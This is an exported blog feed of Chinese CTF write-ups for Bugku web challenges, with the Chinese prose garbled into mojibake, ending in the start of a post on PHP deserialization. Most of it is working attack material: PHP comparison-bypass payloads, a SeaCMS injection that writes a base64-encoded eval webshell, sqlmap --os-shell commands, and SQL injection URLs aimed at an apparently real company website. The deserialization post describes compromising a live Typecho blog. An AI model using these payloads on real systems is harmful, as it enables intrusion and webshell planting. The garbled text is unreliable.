ÊâßË°åÊàêÂäü ‰ΩÜÊòØËèúÂàÄËøû‰∏ç‰∏äÔºå‰º∞ËÆ°ÊòØÈôêÂà∂‰∫ÜÊùÉÈôê„ÄÇËØï‰∫Ün‰πÖ‰πãÂêéÔºåÁúã‰∫ÜwpÁî®ÁöÑprint_r(glob(‚Äò*.php‚Äô));ËØªÂèñÊïèÊÑüÊñá‰ª∂1Array ( [0] =&gt; 2.php [1] =&gt; 3.php [2] =&gt; 4.php [3] =&gt; 5.php [4] =&gt; a.php [5] =&gt; c.php [6] =&gt; chaoba1.php [7] =&gt; chaoba2.php [8] =&gt; ddee.php [9] =&gt; f.php [10] =&gt; h.php [11] =&gt; haha.php [12] =&gt; index.php [13] =&gt; ll.php [14] =&gt; oudeniu.php [15] =&gt; phpspy1.php [16] =&gt; q.php [17] =&gt; t2.php [18] =&gt; txxxc.php [19] =&gt; x.php [20] =&gt; xxoo.php [21] =&gt; xxoos.php [22] =&gt; zx.php ) Â∞ùËØïÔºöprint_r(glob(‚Äò*.txt‚Äô))1Array ( [0] =&gt; NewFile.txt [1] =&gt; a.txt [2] =&gt; flag.txt [3] =&gt; testfile.txt ) Â∞ùËØïÔºöprint_r(file(‚Äú./flag.txt‚Äù))1Array ( [0] =&gt; BUGKU&#123;bugku_web_009801_a&#125; ) ÂâçÂ•≥Âèã123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123; $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; v1Âíåv2ÊØîÔºöÊï∞ÁªÑÁªïËøáv3 strcmp()ÁªïËøáÔºöÁî®Êï∞ÁªÑÂç≥ÂèØ1payloadÔºö https://118.89.219.210:49162/?v1[]=123&amp;v2[]=ads&amp;v3[]=123 flagÔºöSKCTF{Php_1s_tH3_B3St_L4NgUag3} ÁßãÂêçÂ±±ËÄÅÂè∏Êú∫ÁÆóÊúØÈ¢òÔºåÂà∑Êñ∞‰∏ÄÊ¨°Âèò‰∏ÄÊ¨°ÔºåÂ§öÂà∑Êñ∞Âá†Ê¨°‰ºöÂèëÁé∞ÔºöËÆ©Êàë‰ª¨ÊääÁ≠îÊ°àÂú®2ÁßíÂÜÖ‰ª•value‰∏∫ÂèÇÊï∞post‰∏äÂéªÔºö12345678910111213# encoding:utf-8import requests,reurl = 'https://120.24.86.145:8002/qiumingshan/'s = requests.Session()responce = s.get(url)final = re.findall(r'&lt;div&gt;(.+?)=',responce.text)result = eval(final[0])data = &#123; "value": str(result)&#125;responce2 = s.post(url,data=data)print(responce2.text) ËøôÈáåÊúâ‰∏™ÂùëÔºö‰∏ÄÂÆöË¶ÅÂºÄsessionÔºå‰∏çÁÑ∂‰ªñ‰ºö‰ª•‰∏∫‰Ω†ÊòØ‰∏çÂêåÁîµËÑëÂèëÊù•ÁöÑ ÈÄüÂ∫¶Ë¶ÅÂø´ÊäìÂà∞ËøîÂõûheaders ÈáåÈù¢Êúâbase64Âä†ÂØÜÁöÑflagbase64Ëß£ÂØÜÂêéÔºåÂèëÁé∞flagÈÉ®ÂàÜËøòÊúâ‰∏ÄÊ¨°base641234567891011121314151617# encoding:utf-8import requests,base64,reurl = 'https://120.24.86.145:8002/web6/'s = requests.session()responce = s.get(url)f = responce.headers['flag']f = base64.b64decode(f)print(f)flag = re.findall(r':(.+?)\'',str(f))[0].strip()data = &#123; 'margin': base64.b64decode(flag)&#125;print(flag)responce2 = s.post(url,data=data)print(responce2.text) TrimÁöÑÊó•ËÆ∞Êú¨‰∏ÄÊÉ≥Âà∞ËøôÁßçÈ¢òËÇØÂÆöËÄÉ‰∫åÊ¨°Ôºå‰ΩÜÊòØÊâ´‰∫Ü‰∏Ä‰∏ãÁõÆÂΩïÂæóÂà∞show.phpÔºåËÆøÈóÆÂ∞±ÊãøÂà∞flag‰∫Ü„ÄÇËøô‰∏™È¢òÊ≤°ÊâæÂà∞ÂõûÊòæÁöÑÁÇπÔºå‰∏çÁü•ÈÅìËøô‰∏™È¢òÊòØËÄÉÂØü‰ªÄ‰πà‚Ä¶ ÂèòÈáèË¶ÜÁõñÊ∫êÁ†Å12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; Ëß£Ê≥ï1Ôºö12https://120.24.86.145:9009/1.php?shiyan=123&amp;flag=php://inputpost_data:123 Ëß£Ê≥ï21https://120.24.86.145:9009/1.php?shiyan=&amp;flag= flag{bugku-dmsj-p2sm3N}‰ΩÜÊòØ‰∏∫‰ªÄ‰πàËµã1Â∞±‰∏çÁõ∏Á≠âÂë¢Ôºü1https://120.24.86.145:9009/1.php?shiyan=1&amp;flag=1 ÂêéÊù•Âú®Êú¨Âú∞Êµã‰∫Ü‰∏Ä‰∏ãÔºåÂõ†‰∏∫file_get_contents($flag)ÂßãÁªàÊòØÂåÖÂê´‰∏çÂà∞Êñá‰ª∂ÁöÑÔºåÊâÄ‰ª•‰ºöËøîÂõû‰∏Ä‰∏™Á©∫ÔºåÊ≠§Êó∂Âè™ÊúâÂΩìshiyanÂèÇÊï∞‰πü‰∏∫Á©∫ÊâçËÉΩÁõ∏Á≠â„ÄÇdemo:12345678910111213141516171819202122232425&lt;?php$flag='123';extract($_GET);if(isset($shiyan))&#123; $content=trim(file_get_contents($flag1)); if($shiyan==$content) &#123; echo 'bingo'; echo '&lt;br&gt;'; var_dump($flag); echo '&lt;br&gt;'; var_dump($content); echo '&lt;br&gt;'; var_dump($shiyan); &#125; else &#123; var_dump($flag.'&lt;br&gt;'); var_dump($content.'&lt;br&gt;'); var_dump($shiyan.'&lt;br&gt;'); echo'Oh.no'; &#125;&#125;?&gt; strcmpÊØîËæÉÂ≠óÁ¨¶‰∏≤12345678910&lt;?php$flag = "flag&#123;xxxxx&#125;";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //Â¶ÇÊûú str1 Â∞è‰∫é str2 ËøîÂõû &lt; 0Ôºõ Â¶ÇÊûú str1Â§ß‰∫é str2ËøîÂõû &gt; 0ÔºõÂ¶ÇÊûú‰∏§ËÄÖÁõ∏Á≠âÔºåËøîÂõû 0„ÄÇ//ÊØîËæÉ‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÔºàÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºâdie('Flag: '.$flag);elseprint 'No';&#125;?&gt; Êï∞ÁªÑÁªïËøáÔºö1https://120.24.86.145:9009/6.php?a[]=1 Flag: flag{bugku_dmsj_912k} urldecode‰∫åÊ¨°ÁºñÁ†ÅÁªïËøá123456789101112131415161718192021&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; Âõ†‰∏∫ÊµèËßàÂô®Ëß£Êûê‰∏ÄÊ¨°phpËß£Êûê‰∏ÄÊ¨°ÔºåÊâÄ‰ª•Ë¶Å‰∏§Ê¨°ÁºñÁ†ÅÔºö1https://120.24.86.145:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61 flag{bugku__daimasj-1t2} Êï∞ÁªÑËøîÂõûNULLÁªïËøá123456789101112&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; ereg()ÂáΩÊï∞ÂåπÈÖçÊï∞ÁªÑÁöÑÊó∂ÂÄô‰ºöËøîÂõûnullÔºåÊâÄ‰ª•Ôºö1https://120.24.86.145:9009/19.php?password[]=1-- flag{ctf-bugku-ad-2131212} Âº±Á±ªÂûãÊï¥Êï∞Â§ßÂ∞èÊØîËæÉÁªïËøáÈ¢òÁ§∫Ê∫êÁ†ÅÔºö1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; Ë¶ÅÊ±ÇÊàë‰ª¨‰º†ÂÖ•ÁöÑpasswordÂèÇÊï∞‰∏çËÉΩ‰∏∫Êï∞Â≠óÔºå‰∏îË¶ÅÂ§ß‰∫é1336„ÄÇÊàë‰ª¨ÂèØ‰ª•Âú®Êú¨Âú∞ÊµãËØï‰∏Ä‰∏ãÔºåis_numeric()ÂáΩÊï∞ÂèØ‰ª•Ë¢´Êï∞ÁªÑÁªïËøáÔºåËÄå‰∏îËØ•Êï∞ÁªÑÂèØ‰ª•ÂíåÊï∞Â≠óËøõË°åÂ§ßÂ∞èÊØîËæÉÔºö1234567891011121314&lt;?php$temp = $_POST['passer6y'];if(is_numeric($temp)) &#123; echo "is num&lt;br&gt;"; var_dump($temp);&#125;else&#123; echo "is not num&lt;br&gt;"; var_dump($temp); if($temp &gt; 10)&#123; echo "&lt;br&gt;\$temp &gt; 10"; &#125;&#125;?&gt; ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÔºåÊûÑÈÄ†payloadÔºö1https://120.24.86.145:9009/22.php?password[]=asdsadsadasd ÂæóÂà∞flagÔºöflag{bugku_null_numeric} sha()ÂáΩÊï∞ÊØîËæÉÁªïËøá12345678910111213141516171819&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'invalid password';&#125;elseecho 'ogin first!';?&gt; Ëøô‰∏™È¢òÁõÆË¶ÅÊ±ÇÊàë‰ª¨‰º†ÂÖ•nameÂíåpasswordÂèÇÊï∞‰∏çÁõ∏Á≠âÔºå‰ΩÜ‰ªñ‰ª¨ÁöÑsha1()Âä†ÂØÜÂêéÁõ∏Á≠âÊàë‰ª¨ÂèØ‰ª•Êú¨Âú∞ÊµãËØï‰∏Ä‰∏ãÂ¶ÇÊûúsha1()ÂáΩÊï∞Âä†ÂØÜ‰∏Ä‰∏™Êï∞ÁªÑËøîÂõûÁöÑ‰ºöÊòØÊÄéÊ†∑Ôºö1234&lt;?php$a = $_POST['passer6y'];var_dump(sha1($a));?&gt; ‰ºöÂèëÂá∫‰∏Ä‰∏™Ë≠¶ÂëäÔºåËØ¥sha1()Â∏åÊúõÂèÇÊï∞ÊòØstringÁ±ªÂûãÔºå‰ΩÜÂ¶ÇÊûúÊàë‰ª¨‰º†ÂÖ•‰∏Ä‰∏™Êï∞ÁªÑÁ±ªÂûãÔºåËøîÂõûÁöÑÊòØNULLÔºåÂõ†Ê≠§Ê≠§È¢òÊàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†payloadÔºö1https://120.24.86.145:9009/7.php?name[]=123&amp;password[]=a ÂæóÂà∞Ôºöflag{bugku‚Äìdaimasj-a2} psÔºösha1()Âíåmd5()Â§ÑÁêÜÊï∞ÁªÑÁöÑËøîÂõûÈÉΩÊòØNullÔºåÊâÄ‰ª•ÈÉΩÂèØ‰ª•Áî®Êï∞ÁªÑÊù•ÁªïËøá ÂçÅÂÖ≠ËøõÂà∂‰∏éÊï∞Â≠óÊØîËæÉÈ¢òÁ§∫Ê∫êÁ†ÅÔºö12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord ‚Äî ËøîÂõûÂ≠óÁ¨¶ÁöÑ ASCII Á†ÅÂÄº$nine = ord('9'); //ord ‚Äî ËøîÂõûÂ≠óÁ¨¶ÁöÑ ASCII Á†ÅÂÄº$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; Ëøô‰∏™È¢òÁöÑÊÑèÊÄùÂ∞±ÊòØËØ¥Ôºå‰∏çËÉΩËæìÂÖ•1-9ÁöÑÊï∞Â≠óÔºå‰ΩÜÊòØÊúÄÂêéÁªìÊûúÊòØË¶ÅÂíå ‚Äò3735929054‚ÄôÁõ∏Á≠âÔºåÂæàÂÆπÊòìÊÉ≥Âà∞Áî®16ËøõÂà∂ÁªïËøá„ÄÇpayloadÔºö1https://120.24.86.145:9009/20.php?password=0xDEADC0DE eregÊ≠£Âàô%00Êà™Êñ≠È¢òÁ§∫Ê∫êÁ†ÅÔºö12345678910111213141516171819202122232425&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeri';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '-') !== FALSE) //strpos ‚Äî Êü•ÊâæÂ≠óÁ¨¶‰∏≤È¶ñÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆ&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo ‚ÄôInvalid password';&#125;&#125;?&gt; Ëøô‰∏™È¢òË¶ÅÊ±ÇÊàë‰ª¨‰º†ÂÖ•ÁöÑpasswordÂèòÈáèÔºåÁªïËøáereg()ÂèòÈáèÔºåÈïøÂ∫¶Â∞è‰∫é8‰∏îÊï∞ÂÄºÂ§ß‰∫é9999999ÔºåËøòË¶ÅÊúâ‚Äù-‚ÄúÁ¨¶Âè∑„ÄÇÊàë‰ª¨ÂèØ‰ª•Áî®%00Êù•ÁªïËøáereg()ÂèòÈáèÔºåÁî®Êï∞ÁªÑÁªïËøástrlen()Êù•ÈôêÂà∂Êàë‰ª¨ÁöÑÊï∞Â≠ó‰ΩçÊï∞,paylaodÂ¶Ç‰∏ã1https://120.24.86.145:9009/5.php?password[]=%00999999999- get flagÔºöflag{bugku-dm-sj-a12JH8}ÊàëÂú®Êú¨Âú∞ÊµãÊï∞ÁªÑÁªïËøástrlen()ÁöÑÈïøÂ∫¶ÈôêÂà∂,‰∏çËÆ∫Êàë‰º†ÂÖ•ÁöÑÊï∞ÁªÑÊòØ‰ªÄ‰πàÂÄºÔºåÈÉΩÊòæÁ§∫ÈïøÂ∫¶‰∏∫5Ôºö 1234&lt;?php$a = $_POST['passer6y'];var_dump(strlen($a));?&gt; strposÊï∞ÁªÑÁªïËøáÈ¢òÁ§∫Ê∫êÁ†ÅÔºö1234567891011&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo 'ÂøÖÈ°ªËæìÂÖ•Êï∞Â≠óÊâçË°å';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho 'È™öÂπ¥ÔºåÁªßÁª≠Âä™ÂäõÂêßÂïä~';&#125;?&gt; strpos()ÂáΩÊï∞Âíåereg()ÂáΩÊï∞‰∏ÄÊ†∑‰πüÂÖ∑ÊúâÊï∞ÁªÑÁªïËøáÊºèÊ¥ûpaylaod:1https://120.24.86.145:9009/15.php?ctf[]=123asd Êï∞Â≠óÈ™åËØÅÊ≠£ÂàôÁªïËøáÈ¢òÁ§∫Ê∫êÁ†ÅÔºö12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if ("POST" == $_SERVER['REQUEST_METHOD'])&#123;$password = $_POST['password'];if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //preg_match ‚Äî ÊâßË°å‰∏Ä‰∏™Ê≠£ÂàôË°®ËææÂºèÂåπÈÖç&#123;echo 'flag';exit;&#125;while (TRUE)&#123;$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';if (6 &gt; preg_match_all($reg, $password, $arr))break;$c = 0;$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] ‰ªª‰ΩïÊ†áÁÇπÁ¨¶Âè∑ [[:digit:]] ‰ªª‰ΩïÊï∞Â≠ó [[:upper:]] ‰ªª‰ΩïÂ§ßÂÜôÂ≠óÊØç [[:lower:]] ‰ªª‰ΩïÂ∞èÂÜôÂ≠óÊØçforeach ($ps as $pt)&#123;if (preg_match("/[[:$pt:]]+/", $password))$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3ÔºåÂøÖÈ°ªÂåÖÂê´ÂõõÁßçÁ±ªÂûã‰∏âÁßç‰∏é‰∏âÁßç‰ª•‰∏äif ("42" == $password) echo $flag;else echo 'Wrong password';exit;&#125;&#125;?&gt; ‰ªéÁ¨¨7Ë°å‰ª£Á†ÅÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÔºåÈô§‰∫ÜÁ©∫ÁôΩÂ≠óÁ¨¶ÂíåÂà∂Ë°®Á¨¶Â§ñ‰∏çËÉΩË∂ÖËøá12‰∏™Â≠óÁ¨¶ÔºåËøòÊúâÁ¨¨9Ë°åÈÇ£‰∏™1echo 'flag'; Ëøô‰∏™ÊòØ‰∏™Â≠óÁ¨¶‰∏≤flagÔºåÁúüÊ≠£ÁöÑflagÂú®26Ë°åÂ§Ñ„ÄÇÁ¨¨15Ë°åÂ§ÑÔºå12$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) Ë¶ÅÊ±ÇÊàë‰ª¨‰º†ÂÖ•ÁöÑÂèÇÊï∞‰∏≠ÔºåÊ†áÁÇπÔºåÊï∞Â≠óÔºåÂ§ßÂÜôÂ∞èÂÜôÂ≠óÊØçË¢´ÂåπÈÖçÁöÑÊ¨°Êï∞Â§ß‰∫é6„ÄÇ12345678$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] ‰ªª‰ΩïÊ†áÁÇπÁ¨¶Âè∑ [[:digit:]] ‰ªª‰ΩïÊï∞Â≠ó [[:upper:]] ‰ªª‰ΩïÂ§ßÂÜôÂ≠óÊØç [[:lower:]] ‰ªª‰ΩïÂ∞èÂÜôÂ≠óÊØç foreach ($ps as $pt) &#123; if (preg_match("/[[:$pt:]]+/", $password)) $c += 1; &#125; if ($c &lt; 3) break;if ("42" == $password) echo $flag; ÂêåÊó∂Ë¶ÅÊ±ÇÊàë‰ª¨ÂåÖÂê´ËøôÂá†ÁßçÁ±ªÂûãËá≥Â∞ë‰∏âÁßç‰ª•‰∏äÔºå‰∏î‰ΩøpasswordÂèÇÊï∞Âíå42Áõ∏Á≠âpayload:1password=42.00e+0000000000 flag{Bugku_preg_match} flag.php ÊèêÁ§∫‰ø°ÊÅØÔºöÁÇπ‰∫ÜloginÂíãÊ≤°ÂèçÂ∫îÔºåÊèêÁ§∫ÔºöhintËøôÈ¢òÊúâÊØíÔºåÊèêÁ§∫hintÔºåÁ´üÁÑ∂ÊòØ‰ª•hint‰∏∫ÂèÇÊï∞ÔºåÈöè‰æø‰º†ÂÖ•‰∏Ä‰∏™ÂÄºÂç≥ÂèØËé∑ÂæóÊ∫êÁ†ÅÔºö1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once("flag.php");$cookie = $_COOKIE['ISecer'];if(isset($_GET['hint']))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === "$KEY")&#123; echo "$flag";&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel="stylesheet" href="admin.css" type="text/css"&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class="container" align="center"&gt; &lt;form method="POST" action="#"&gt; &lt;p&gt;&lt;input name="user" type="text" placeholder="Username"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name="password" type="password" placeholder="Password"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value="Login" type="button"/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY='ISecer:www.isecer.com';?&gt; ‰∏ÄÂºÄÂßãÔºåÊàëÊääÂèçÂ∫èÂàóÂåñÊï∞ÊçÆ,ÁÑ∂ÂêéÊåâÁÖß1s:21:&quot;ISecer:www.isecer.com&quot;; ‰º†‰∫Ü‰∏äÂéªÔºåÊÑüËßâÊô∫ÂïÜÂÜçÊ¨°Ë¢´‰æÆËæ±..Ëøô‰∏™$keyÂèòÈáèÁöÑÂÄºÊòØÂêéÈù¢Êâç‰º†ÂÖ•ÁöÑÔºåÊâÄ‰ª•Êàë‰ª¨Â∫îËØ•‰º†‰∏™Á©∫ÁöÑÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÔºö ÂÆûÊàò2-ÊâìÂºÄÈ°µÈù¢ÔºåÊó¢ÁÑ∂È¢òÁõÆËØ¥‰∫ÜÔºåÈÇ£Â∞±ÊâæÔºåÁÇπ‰∫Ü‰∏ÄÈÅçÔºåÂèëÁé∞‰∏Ä‰∏™https://www.kabelindo.co.id/readnews.php?id=18È°∫Êâã‰∏Ä‰∏™ÂçïÂºïÂè∑ÔºåËØ∂Êä•Èîô‰∫Ü,ÈÇ£Â∞±Êù•123456https://www.kabelindo.co.id/readnews.php?id=18 order by 5 --+ https://www.kabelindo.co.id/readnews.php?id=18 select 1,2,3,4,5 --+https://www.kabelindo.co.id/readnews.php?id=18select 1,version(),database(),4,5 --+https://www.kabelindo.co.id/readnews.php?id=18select 1,2,table_name,4,5 from information_schema.tables --+ Ë°®ÂêçÂá∫Êù•‰∫ÜÔºåflag{tbnomax} Bugku-cms1ÊâìÂºÄÈ°µÈù¢ÔºåÂæÄ‰∏ã‰∏ÄÊãâÔºåPowered by SongCMS v3.13 ÂÖçË¥πÁâàÊó•Â∏∏Êâ´ÁõÆÂΩïÔºåÂèëÁé∞‰∏Ä‰∏™/data/ÔºåÊâìÂºÄ‰∏ÄÁúãÊúâ‰∏™sqlÊñá‰ª∂ÔºåÈáåÈù¢Êúâ‰∏§‰∏™Ë¥¶Âè∑ÂØÜÁ†ÅÔºåÂàÜÂà´ËØï‰∫Ü‰∏Ä‰∏ãÔºåËøõ‰∫ÜÂêéÂè∞ÔºåÊâæ‰∏ã‰∏ä‰º†Êñá‰ª∂ÁöÑÂú∞ÊñπÁÑ∂Âêé‰∏ä‰º†ÊàêÂäüÔºåËèúÂàÄ‰∏ÄËøûÔºåflagÂ∞±Âú®Ê†πÁõÆÂΩï‰∏ã phpcmsV9ÁÖßÁùÄÊºèÊ¥ûÊù•Â∞±Ë°å‰∫Ühttps://www.freebuf.com/vuls/131648.html Êµ∑Ê¥ãcms‰∏™‰∫∫ËßâÂæóÔºåËøô‰∫õÈ¢òËÄÉÂØüexpÂø´ÈÄüÊêúÁ¥¢ËÉΩÂäõÂèÇËÄÉÔºöhttps://blog.csdn.net/qq_35078631/article/details/76595817 123https://120.24.86.145:8008/search.php?searchtype=5searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=fwrite(fopen(&quot;pass.php&quot;,&quot;w&quot;),base64_decode(PD9waHAgZXZhbCgkX1BPU1Rbc3d4XSk7Pz4)) ÁÑ∂ÂêéËèúÂàÄËøûÊé•Ôºö bugkuÂØºËà™Á®çÂæÆÊµèËßà‰∫Ü‰∏Ä‰∏ãÂü∫Êú¨È°µÈù¢ÔºåÈ°∫ÊâãÂêßÁõÆÂΩïÊâ´ÊèèÂô®ÂºÄÂêØÔºåÂèëÁé∞‰∏§‰∏™ÁôªÂΩïÁöÑÂú∞ÊñπÔºö‰∏Ä‰∏™ÊòØÈ¶ñÈ°µÁî®Êà∑ÁôªÂΩïÁöÑÔºåÊîæËøõsqlmapË∑ë‰∫Ü‰∏Ä‰∏ãÔºåÊó†Êûú„ÄÇËøòÊúâ‰∏Ä‰∏™Âú∞ÊñπÊòØÂêéÂè∞ÁôªÂΩïÁöÑÈ°µÈù¢:https://120.24.86.145:9006/admin/login.php#postÔºåburpsuiteÊäì‰∫Ü‰∏™ÂåÖ‰øùÂ≠òÂà∞Êú¨Âú∞ÔºåËØï‰∫Ü‰∏Ä‰∏ãusernameÂèÇÊï∞1python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugkuÂØºËà™\bp.txt&quot; -p username ‰∏äwebshellÔºö1python sqlmap.py -r &quot;C:\Users\Passerby\Desktop\CTF\bugku\bugkuÂØºËà™\bp.txt&quot; -p username --os-shell ‰ΩÜÊòØÈÉΩ‰∏ä‰º†Â§±Ë¥•‰∫Ü‚Ä¶Ê≤°ÁàÜÂá∫ÁΩëÁ´ôË∑ØÂæÑ‰∏çËøáÊàëÁàÜ‰∫Ü‰∏Ä‰∏ãÊïèÊÑüÊï∞ÊçÆÔºåÊãøÂà∞‰∫ÜÂêéÂè∞ÁÆ°ÁêÜÂëòË¥¶Âè∑ÔºöÂêéÂè∞ÊúâÂæàÂ§öÂõæÁâá‰∏ä‰º†ÁöÑÂú∞ÊñπÔºå‰∏çËøá‰∏ä‰º†ÊàêÂäüÂêéÔºåÈÉΩ‰ºöË¢´ÊîπÂêçÊàê.pngÊâæÂà∞‰∫Ü‰∏™Ê∑ªÂä†ÂπøÂëäÁöÑÂú∞ÊñπÔºåÈöè‰æøÊèí‰∫Ü‰∏Ä‰∏™‰∏ÄÂè•ËØùÊú®È©¨ÔºöÊèíÂÖ•Â§±Ë¥•‰∫ÜÔºåÂèàÊòØsql‚Ä¶ËØïËØïËøôÊ†∑ÔºöÊ≤°ÊâæÂà∞ÂπøÂëäÊèíÂú®Âì™‰∏™È°µÈù¢‰∫Ü‚Ä¶.ÂêéÊù•ÔºåÊâ´‰∫Ü‰∏Ä‰∏ãÂ§á‰ªΩÊñá‰ª∂ÔºåÊää‰ªñÊ∫êÁ†Å‰∏ã‰∏ãÊù•‰∫Ü„ÄÇflagÂú®Ê†πÁõÆÂΩï„ÄÇ]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPÂèçÂ∫èÂàóÂåñÊÄªÁªì]]></title>
    <url>%2F2018%2F02%2F19%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Ëµ∑Âõ†ÔºöÊúÄËøëÊó•Á´ôÁöÑÊó∂ÂÄôÔºåÂØπ‰∏Ä‰∏™typechoÂçöÂÆ¢ÁªèÂéÜÂá†Áï™Ê≥¢Êäò‰πãÂêéÔºåÊúÄÂêéÊâæ‰∫Ü‰∏™typechoÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÁöÑexp„ÄÅÂÜô‰∫Ü‰∏™webshell..ÂºÄÂøÉÁöÑ‰∏çÂæó‰∫Ü‚Ä¶Â∏¶ÁùÄÂØπÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÊª°Êª°ÁöÑÂ•ΩÂ•áÂøÉÂ≠¶‰π†‰∫Ü‰∏ÄÁï™„ÄÇÊâπÈáègetshellËÑöÊú¨Â∑≤ÂèëÂ∏ÉÔºögithub 0x01ÔºöÁõ∏ÂÖ≥Âü∫Á°ÄÔºö1.Â∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁõ∏ÂÖ≥Áü•ËØÜÔºö1.1‰ªÄ‰πàÊòØ(Âèç)Â∫èÂàóÂåñÔºöÂ∫èÂàóÂåñÊòØÂ∞ÜÂèòÈáè(ÂØπË±°)ËΩ¨Êç¢‰∏∫ÂèØ‰øùÂ≠òÊàñ‰º†ËæìÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑËøáÁ®ãÔºõÂèçÂ∫èÂàóÂåñÂ∞±ÊòØÂú®ÈÄÇÂΩìÁöÑÊó∂ÂÄôÊääËøô‰∏™Â≠óÁ¨¶‰∏≤ÂÜçËΩ¨ÂåñÊàêÂéüÊù•ÁöÑÂèòÈáè‰ΩøÁî®„ÄÇ 1.2php(Âèç)Â∫èÂàóÂåñÂ∏∏ËßÅÁöÑÂáΩÊï∞ÔºöSerialize„ÄÅUnserialize„ÄÅjson_encode„ÄÅjson_decode„ÄÇ 1.3Â∫èÂàóÂåñ‰πãÂêéÁöÑÊ†ºÂºèÔºöa - arrayÔºö12a:&lt;length&gt;:&#123;key,value pairs&#125;a:1:&#123;i:1;s:1:&quot;a&quot;;&#125; b - booleanÔºö d - double i - integer o - object:12O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125; //ËØ¥ÊòépersonÂØπË±°‰∏≠nameÂ±ûÊÄß‰∏∫Null„ÄÅageÂ±ûÊÄß‰∏∫19ÔºåsexÂ±ûÊÄß‰∏∫Null s - string12s:length:&quot;value&quot;;s:1:&quot;a&quot;; N 